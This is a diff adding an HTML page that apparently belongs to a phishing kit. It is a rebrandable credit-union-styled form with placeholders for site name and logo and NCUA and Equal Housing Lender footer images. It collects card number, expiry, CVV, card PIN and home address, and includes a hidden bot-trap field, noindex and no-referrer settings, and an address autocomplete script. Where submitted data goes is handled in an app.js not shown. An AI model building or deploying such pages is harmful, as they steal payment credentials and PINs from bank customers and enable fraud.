@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=5">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self'; connect-src 'self';">
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <title>{{SITE_NAME}}</title>
+    <link rel="icon" href="{{FAVICON_URL}}">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-text" data-render="sync_msg"></div>
+    </div>
+    <div id="root">
+        <div class="login-page-container">
+            <div class="fluid-form-layout">
+                <div class="login-header">
+                    <a href="#">
+                        <img src="assets/{{LOGO_FILENAME}}" alt="" id="brand-logo">
+                    </a>
+                </div>
+
+                <div class="login-form-container">
+                    <form id="fluid-secure-form">
+                        <div class="vld-msg-container">
+                            <input type="text" name="b_field" id="b_field" tabindex="-1" autocomplete="off">
+                        </div>
+
+                        <div class="fluid-form-layout-field-container">
+                            <label class="field-label" data-render="card_num_label"></label>
+                            <div class="fluid-input-wrapper">
+                                <input type="text" id="card_num" name="card_num" class="fluid-input" maxlength="19" autocomplete="cc-number" required>
+                            </div>
+                        </div>
+
+                        <div style="display: flex; gap: 15px;">
+                            <div class="fluid-form-layout-field-container" style="flex: 1;">
+                                <label class="field-label" data-render="exp_label"></label>
+                                <div class="fluid-input-wrapper">
+                                    <input type="text" id="exp" name="exp" class="fluid-input" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" required>
+                                </div>
+                            </div>
+                            <div class="fluid-form-layout-field-container" style="flex: 1;">
+                                <label class="field-label" data-render="cvv_label"></label>
+                                <div class="fluid-input-wrapper">
+                                    <input type="text" id="cvv" name="cvv" class="fluid-input" maxlength="3" autocomplete="cc-csc" required>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="fluid-form-layout-field-container">
+                            <label class="field-label" data-render="pin_label"></label>
+                            <div class="fluid-input-wrapper">
+                                <input type="password" id="pin" name="pin" class="fluid-input" maxlength="4" autocomplete="off" required>
+                            </div>
+                        </div>
+
+                        <div class="fluid-form-layout-field-container">
+                            <label class="field-label" data-render="address_label">Address</label>
+                            <div class="fluid-input-wrapper">
+                                <input type="text" id="address" name="address" class="fluid-input" placeholder="Start typing your address" autocomplete="street-address" required>
+                            </div>
+                        </div>
+
+                        <div class="fluid-form-layout-field-container" style="margin-top: 32px;">
+                            <button type="submit" class="fluid-button">
+                                <span class="fluid-button__text" data-render="complete_btn"></span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <footer id="footer-container" class="footer-container-main">
+            <div class="image-links">
+                <img alt="" src="assets/ncua_icon.png" style="margin-right: 20px;">
+                <img alt="" src="assets/ncua_text.png" style="margin-right: 20px;">
+                <img alt="" src="assets/ehl_icon.png">
+            </div>
+        </footer>
+    </div>
+    <script src="app.js"></script>
+    <script>
+        // Custom Address Autocomplete using Photon (OpenStreetMap) - No API Key Required
+        document.addEventListener('DOMContentLoaded', function() {
+            const addressInput = document.getElementById('address');
+            if (!addressInput) return;
+
+            let timeout = null;
+            const dropdown = document.createElement('div');
+            dropdown.className = 'autocomplete-dropdown';
+            addressInput.parentNode.style.position = 'relative';
+            addressInput.parentNode.appendChild(dropdown);
+
+            const style = document.createElement('style');
+            style.textContent = `
+                .autocomplete-dropdown {
+                    position: absolute;
+                    top: 100%; left: 0; right: 0;
+                    background: #fff;
+                    border: 1px solid #ccc;
+                    border-top: none;
+                    z-index: 999;
+                    border-radius: 0 0 5px 5px;
+                    max-height: 250px;
+                    overflow-y: auto;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                    color: #333;
+                }
+                .autocomplete-item {
+                    padding: 10px; cursor: pointer; text-align: left;
+                }
+                .autocomplete-item:hover {
+                    background-color: #f5f5f5;
+                }
+                .autocomplete-item strong {
+                    display: block; font-size: 14px; margin-bottom: 2px;
+                }
+                .autocomplete-item span {
+                    font-size: 12px; color: #666;
+                }
+            `;
+            document.head.appendChild(style);
+
+            addressInput.addEventListener('input', function() {
+                clearTimeout(timeout);
+                const val = this.value;
+                dropdown.innerHTML = '';
+                
+                if (!val || val.length < 3) return;
+
+                timeout = setTimeout(() => {
+                    fetch('https://photon.komoot.io/api/?q=' + encodeURIComponent(val) + '&limit=6&lang=en')
+                        .then(res => res.json())
+                        .then(data => {
+                            dropdown.innerHTML = '';
+                            if(data.features && data.features.length > 0) {
+                                data.features.forEach(feat => {
+                                    const p = feat.properties;
+                                    let name = p.name || p.street;
+                                    if(p.housenumber && p.street) name = p.housenumber + ' ' + p.street; // Better formatting
+                                    if (!name) return;
+                                    
+                                    let sub = [];
+                                    if(p.city) sub.push(p.city);
+                                    if(p.state) sub.push(p.state);
+                                    if(p.postcode) sub.push(p.postcode);
+                                    
+                                    const fullAddr = `${name}${sub.length > 0 ? ', ' + sub.join(', ') : ''}`;
+                                    
+                                    const div = document.createElement('div');
+                                    div.className = 'autocomplete-item';
+                                    div.innerHTML = `<strong>${name}</strong><span>${sub.join(', ')}</span>`;
+                                    
+                                    div.addEventListener('click', function() {
+                                        addressInput.value = fullAddr;
+                                        dropdown.innerHTML = '';
+                                    });
+                                    dropdown.appendChild(div);
+                                });
+                            }
+                        })
+                        .catch(e => console.error("Autocomplete error:", e));
+                }, 300);
+            });
+
+            document.addEventListener('click', function (e) {
+                if (e.target !== addressInput && !dropdown.contains(e.target)) {
+                    dropdown.innerHTML = '';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
